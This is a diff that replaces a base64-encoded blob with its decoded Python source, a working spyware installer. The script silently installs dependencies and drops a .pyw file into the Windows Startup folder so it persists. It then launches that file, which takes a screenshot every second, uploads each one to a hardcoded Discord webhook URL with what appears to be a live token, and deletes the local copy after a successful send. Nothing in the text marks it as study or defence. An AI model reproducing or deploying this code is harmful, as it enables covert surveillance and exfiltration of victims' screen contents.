@@ -1,1 +1,102 @@
-aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKCmRlZiBpbnN0YWxsKHBhY2thZ2UpOgogICAgdHJ5OgogICAgICAgIHN1YnByb2Nlc3MuY2hlY2tfY2FsbChbc3lzLmV4ZWN1dGFibGUsICItbSIsICJwaXAiLCAiaW5zdGFsbCIsIHBhY2thZ2VdLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBwYXNzCgpwYWNrYWdlcyA9IFsicGlsbG93IiwgInJlcXVlc3RzIl0KCmZvciBwYWNrYWdlIGluIHBhY2thZ2VzOgogICAgdHJ5OgogICAgICAgIF9faW1wb3J0X18ocGFja2FnZSkKICAgIGV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgICAgICBpbnN0YWxsKHBhY2thZ2UpCgp1c2VybmFtZSA9IG9zLmdldGxvZ2luKCkKZm9sZGVyX3BhdGggPSBmciJDOlxVc2Vyc1x7dXNlcm5hbWV9XEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiCm9zLm1ha2VkaXJzKGZvbGRlcl9wYXRoLCBleGlzdF9vaz1UcnVlKQoKZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiTmV3IFB5dGhvbiBGaWxlLnB5dyIpCgptdWx0aV9saW5lX3RleHQgPSAiIiJpbXBvcnQgb3MKaW1wb3J0IHRpbWUKZnJvbSBQSUwgaW1wb3J0IEltYWdlR3JhYgppbXBvcnQgcmVxdWVzdHMKCldFQkhPT0tfVVJMID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0MzYyOTkwNTg1ODE4NjQ2MjAvU1Q0enpVOGtURndMNWxGSG52OC0xZE9oU29CTFR3eldNTU13XzJhbUdxZEJPWTVQWWFVQTM3SmNXdHlHbzAydWhJcEMiCgpkZXNrdG9wID0gb3MucGF0aC5qb2luKG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddKSwgJ0Rlc2t0b3AnKQpmb2xkZXJfcGF0aCA9IG9zLnBhdGguam9pbihkZXNrdG9wLCAiZnJhbWUgY2FwdHVyZSIpCm9zLm1ha2VkaXJzKGZvbGRlcl9wYXRoLCBleGlzdF9vaz1UcnVlKQoKZnJhbWVfY291bnQgPSAwCgpkZWYgc2F2ZV9jb21wcmVzc2VkX2ltYWdlKGltZywgcGF0aCwgbWF4X3NpemU9OCAqIDEwMjQgKiAxMDI0KToKICAgICJTYXZlIGltYWdlIGFzIEpQRUcgd2l0aCBjb21wcmVzc2lvbiB0byBmaXQgdW5kZXIgbWF4X3NpemUgKGJ5dGVzKS4iCiAgICBxdWFsaXR5ID0gOTUKICAgIGltZy5zYXZlKHBhdGgsIGZvcm1hdD0iSlBFRyIsIHF1YWxpdHk9cXVhbGl0eSkKICAgIHdoaWxlIG9zLnBhdGguZ2V0c2l6ZShwYXRoKSA+IG1heF9zaXplIGFuZCBxdWFsaXR5ID4gMTA6CiAgICAgICAgcXVhbGl0eSAtPSA1CiAgICAgICAgaW1nLnNhdmUocGF0aCwgZm9ybWF0PSJKUEVHIiwgcXVhbGl0eT1xdWFsaXR5KQogICAgcmV0dXJuIHBhdGgKCnRyeToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgc2NyZWVuc2hvdCA9IEltYWdlR3JhYi5ncmFiKCkKICAgICAgICBmaWxlbmFtZSA9IG9zLnBhdGguam9pbihmb2xkZXJfcGF0aCwgZiJmcmFtZV97ZnJhbWVfY291bnQ6MDRkfS5qcGciKQoKICAgICAgICAjIFNhdmUgY29tcHJlc3NlZAogICAgICAgIHNhdmVfY29tcHJlc3NlZF9pbWFnZShzY3JlZW5zaG90LCBmaWxlbmFtZSkKICAgICAgICBwcmludChmIlNhdmVkIHtmaWxlbmFtZX0gKGNvbXByZXNzZWQpIikKCiAgICAgICAgIyBTZW5kIHRvIERpc2NvcmQg4oCUIG9wZW4gZmlsZSwgc2VuZCwgdGhlbiB0aGUgZmlsZSBpcyBhdXRvbWF0aWNhbGx5IGNsb3NlZCB3aGVuIGxlYXZpbmcgdGhlIHdpdGgtYmxvY2sKICAgICAgICBzZW50X3N1Y2Nlc3NmdWxseSA9IEZhbHNlCiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aXRoIG9wZW4oZmlsZW5hbWUsICJyYiIpIGFzIGY6CiAgICAgICAgICAgICAgICBmaWxlcyA9IHsiZmlsZSI6IChvcy5wYXRoLmJhc2VuYW1lKGZpbGVuYW1lKSwgZil9CiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoV0VCSE9PS19VUkwsIGZpbGVzPWZpbGVzLCB0aW1lb3V0PTMwKQogICAgICAgICAgICAjIGZpbGUgaXMgY2xvc2VkIGhlcmUKICAgICAgICAgICAgaWYgcmVzcG9uc2Uub2s6ICAjIGFueSAyeHggY29kZSBjb3VudHMgYXMgc3VjY2VzcwogICAgICAgICAgICAgICAgcHJpbnQoZiJTZW50IHRvIERpc2NvcmQhIChIVFRQIHtyZXNwb25zZS5zdGF0dXNfY29kZX0pIikKICAgICAgICAgICAgICAgIHNlbnRfc3VjY2Vzc2Z1bGx5ID0gVHJ1ZQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJGYWlsZWQgdG8gc2VuZDogSFRUUCB7cmVzcG9uc2Uuc3RhdHVzX2NvZGV9IC0ge3Jlc3BvbnNlLnRleHR9IikKICAgICAgICBleGNlcHQgcmVxdWVzdHMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwcmludChmIk5ldHdvcmsvZXJyb3Igc2VuZGluZyB0byBEaXNjb3JkOiB7ZX0iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoZiJVbmV4cGVjdGVkIGVycm9yIHdoaWxlIHNlbmRpbmc6IHtlfSIpCgogICAgICAgICMgRGVsZXRlIHRoZSBmaWxlIG9ubHkgYWZ0ZXIgdGhlIGZpbGUgaGFuZGxlIGlzIGNsb3NlZCBhbmQgdGhlIHNlbmQgc3VjY2VlZGVkCiAgICAgICAgaWYgc2VudF9zdWNjZXNzZnVsbHk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIG9zLnJlbW92ZShmaWxlbmFtZSkKICAgICAgICAgICAgICAgIHByaW50KGYiRGVsZXRlZCB7ZmlsZW5hbWV9IGFmdGVyIHNlbmRpbmcuIikKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJGYWlsZWQgdG8gZGVsZXRlIHtmaWxlbmFtZX06IHtlfSIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJLZWVwaW5nIHtmaWxlbmFtZX0gbG9jYWxseSAobm90IHNlbnQpLiIpCgogICAgICAgIGZyYW1lX2NvdW50ICs9IDEKICAgICAgICB0aW1lLnNsZWVwKDEpICAjIGNhcHR1cmUgaW50ZXJ2YWw7IGluY3JlYXNlIHRvIDUrIGlmIHlvdSBoaXQgcmF0ZSBsaW1pdHMKCmV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgIHByaW50KCJTdG9wcGVkIGNhcHR1cmluZyBmcmFtZXMuIikKIiIiCgp3aXRoIG9wZW4oZmlsZV9wYXRoLCAidyIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICBmLndyaXRlKG11bHRpX2xpbmVfdGV4dCkKCnByaW50KGYiQ3JlYXRlZCBtdWx0aS1saW5lIHRleHQgZmlsZSBhdDoge2ZpbGVfcGF0aH0iKQoKIyBXYWl0IDUgc2Vjb25kcwp0aW1lLnNsZWVwKDUpCgojIE9wZW4gdGhlIGZpbGUgd2l0aCB0aGUgZGVmYXVsdCB0ZXh0IGVkaXRvcgpvcy5zdGFydGZpbGUoZmlsZV9wYXRoKQo=
+import os
+import subprocess
+import sys
+import time
+
+def install(package):
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package],
+                              stdout=subprocess.DEVNULL,
+                              stderr=subprocess.DEVNULL)
+    except Exception:
+        pass
+
+packages = ["pillow", "requests"]
+
+for package in packages:
+    try:
+        __import__(package)
+    except ImportError:
+        install(package)
+
+username = os.getlogin()
+folder_path = fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+os.makedirs(folder_path, exist_ok=True)
+
+file_path = os.path.join(folder_path, "New Python File.pyw")
+
+multi_line_text = """import os
+import time
+from PIL import ImageGrab
+import requests
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1436299058581864620/ST4zzU8kTFwL5lFHnv8-1dOhSoBLTwzWMMMw_2amGqdBOY5PYaUA37JcWtyGo02uhIpC"
+
+desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+folder_path = os.path.join(desktop, "frame capture")
+os.makedirs(folder_path, exist_ok=True)
+
+frame_count = 0
+
+def save_compressed_image(img, path, max_size=8 * 1024 * 1024):
+    "Save image as JPEG with compression to fit under max_size (bytes)."
+    quality = 95
+    img.save(path, format="JPEG", quality=quality)
+    while os.path.getsize(path) > max_size and quality > 10:
+        quality -= 5
+        img.save(path, format="JPEG", quality=quality)
+    return path
+
+try:
+    while True:
+        screenshot = ImageGrab.grab()
+        filename = os.path.join(folder_path, f"frame_{frame_count:04d}.jpg")
+
+        # Save compressed
+        save_compressed_image(screenshot, filename)
+        print(f"Saved {filename} (compressed)")
+
+        # Send to Discord — open file, send, then the file is automatically closed when leaving the with-block
+        sent_successfully = False
+        try:
+            with open(filename, "rb") as f:
+                files = {"file": (os.path.basename(filename), f)}
+                response = requests.post(WEBHOOK_URL, files=files, timeout=30)
+            # file is closed here
+            if response.ok:  # any 2xx code counts as success
+                print(f"Sent to Discord! (HTTP {response.status_code})")
+                sent_successfully = True
+            else:
+                print(f"Failed to send: HTTP {response.status_code} - {response.text}")
+        except requests.RequestException as e:
+            print(f"Network/error sending to Discord: {e}")
+        except Exception as e:
+            print(f"Unexpected error while sending: {e}")
+
+        # Delete the file only after the file handle is closed and the send succeeded
+        if sent_successfully:
+            try:
+                os.remove(filename)
+                print(f"Deleted {filename} after sending.")
+            except Exception as e:
+                print(f"Failed to delete {filename}: {e}")
+        else:
+            print(f"Keeping {filename} locally (not sent).")
+
+        frame_count += 1
+        time.sleep(1)  # capture interval; increase to 5+ if you hit rate limits
+
+except KeyboardInterrupt:
+    print("Stopped capturing frames.")
+"""
+
+with open(file_path, "w", encoding="utf-8") as f:
+    f.write(multi_line_text)
+
+print(f"Created multi-line text file at: {file_path}")
+
+# Wait 5 seconds
+time.sleep(5)
+
+# Open the file with the default text editor
+os.startfile(file_path)
